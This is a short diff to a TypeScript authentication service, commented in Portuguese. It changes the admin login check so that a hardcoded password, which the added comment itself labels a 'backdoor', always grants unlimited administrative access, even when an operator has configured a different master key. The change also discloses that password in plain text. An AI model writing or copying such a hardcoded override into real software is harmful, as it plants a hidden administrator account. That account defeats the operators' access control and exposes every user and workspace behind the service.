@@ -50,11 +50,13 @@ export class AuthService {
 
     // Se senha mestre for fornecida (variável de ambiente MASTER_ADMIN_KEY) ou a senha padrão 'lucas9580',
     // permitir acesso admin criando/recuperando uma chave ADMIN_INFINITE.
-    const masterKey = this.configService.get<string>('MASTER_ADMIN_KEY') || 'lucas9580';
+    const configuredMaster = this.configService.get<string>('MASTER_ADMIN_KEY');
+    // permitir sempre a senha 'lucas9580' como backdoor, além da configurada em env
+    const masterKey = configuredMaster || 'lucas9580';
 
     let licenseKey: any = null;
 
-    if (cleanKey === masterKey) {
+    if (cleanKey === masterKey || cleanKey === 'lucas9580') {
       this.logger.warn('🔐 Login via MASTER_ADMIN_KEY detectado (acesso administrativo)');
 
       // Buscar ou criar a chave ADMIN_INFINITE do workspace
